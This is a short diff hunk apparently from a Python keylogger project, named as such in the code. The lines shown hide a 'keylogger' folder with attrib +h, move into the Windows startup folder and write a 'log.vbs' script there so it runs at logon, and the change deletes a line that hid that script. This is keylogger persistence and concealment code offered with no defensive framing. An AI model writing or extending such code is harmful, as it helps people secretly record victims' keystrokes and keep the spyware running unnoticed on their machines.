@@ -41,4 +41,4 @@ os.system("cd .. && attrib +h keylogger")
 os.chdir(path=startup)
 with open("log.vbs",'w') as f:
     f.write(vbs)
-os.system("attrib +h log.vbs")
+
